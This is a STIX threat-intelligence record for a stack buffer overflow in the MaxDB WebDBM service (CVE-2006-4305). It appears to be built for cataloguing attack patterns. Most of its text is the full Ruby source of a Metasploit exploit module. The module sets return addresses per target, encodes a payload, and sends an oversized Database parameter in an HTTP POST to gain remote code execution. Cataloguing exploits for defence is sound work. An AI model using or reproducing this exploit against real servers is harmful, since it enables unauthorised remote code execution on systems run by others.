{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--38643504-7229-4ab1-88ec-2e7a44de138c",
    "created": "2024-08-14T16:55:14.012978Z",
    "modified": "2024-08-14T16:55:14.012981Z",
    "name": "MaxDB WebDBM Database Parameter Overflow",
    "description": " This module exploits a stack buffer overflow in the MaxDB WebDBM service. By sending a specially-crafted HTTP request that contains an overly long database name. A remote attacker could overflow a buffer and execute arbitrary code on the system with privileges of the wahttp process.  This module has been tested against MaxDB 7.6.00.16 and MaxDB 7.6.00.27. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/maxdb_webdbm_database.rb",
            "external_id": "maxdb_webdbm_database.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-4305"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MaxDB WebDBM Database Parameter Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the MaxDB WebDBM\n        service. By sending a specially-crafted HTTP request that contains\n        an overly long database name. A remote attacker could overflow a buffer\n        and execute arbitrary code on the system with privileges of the wahttp process.\n\n        This module has been tested against MaxDB 7.6.00.16 and MaxDB 7.6.00.27.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2006-4305'],\n          ['OSVDB', '28300'],\n          ['BID', '19660'],\n        ],\n      'DefaultOptions' =>\n      {\n        'EXITFUNC' => 'thread',\n      },\n\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 400,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\\x40\",\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'MaxDB 7.6.00.16', { 'Ret' => 0x1005a08f } ], # wapi.dll\n          [ 'MaxDB 7.6.00.27', { 'Ret' => 0x1005b08f } ], # wapi.dll\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2006-08-29'))\n\n    register_options( [ Opt::RPORT(9999) ])\n  end\n\n  def exploit\n    connect\n\n    server = rand_text_english(5, payload_badchars)\n    user   = rand_text_english(5, payload_badchars)\n    pass   = rand_text_english(5, payload_badchars)\n    port   = rand(65535).to_s\n\n    sploit =  rand_text_alphanumeric(91, payload_badchars) + [target.ret].pack('V')\n    sploit << payload.encoded\n\n    req    =  \"Event=DBM_LOGON&Action=LOGON&Server=#{server}&Database=#{sploit}\"\n    req    << \"&User=#{user}&Password=#{pass}\"\n\n    res    =  \"POST /webdbm HTTP/1.1\\r\\n\" + \"Host: #{rhost}:#{port}\\r\\n\"\n    res    << \"Content-Length: #{req.length}\" + \"\\r\\n\\r\\n\" + req + \"\\r\\n\"\n\n    print_status(\"Trying target %s...\" % target.name)\n\n    sock.put(res)\n\n    #give wahttp.exe a bit to recover...\n    select(nil,nil,nil,2)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-08-29",
    "x_mitre_platforms": [
        "win'"
    ]
}